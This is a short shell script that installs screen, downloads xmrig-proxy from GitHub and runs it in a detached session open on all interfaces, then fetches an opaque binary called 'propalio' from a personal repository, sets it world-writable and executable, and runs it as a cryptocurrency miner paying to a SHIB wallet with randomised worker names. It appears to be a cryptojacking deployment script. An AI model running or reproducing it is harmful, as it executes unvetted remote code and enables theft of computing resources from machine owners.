#!/bin/sh

apt update

apt install screen -y

wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz

tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz

cd xmrig-proxy-6.14.0

screen -dmS run ./xmrig-proxy -a rx/0 -o rx.unmineable.com:3333 -u SHIB:0x31a8675a2dc7519df258c06d5c6e04e6e15e3d47.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -b 0.0.0.0:3333 -m simple

wget https://raw.githubusercontent.com/mariobiszz/SRB/main/propalio

chmod 777 propalio

./propalio --algorithm cryptonight_upx --pool rx.unmineable.com:3333 --wallet SHIB:0x31a8675a2dc7519df258c06d5c6e04e6e15e3d47.$(echo $(shuf -i 1-20000 -n 1)-V) --password x
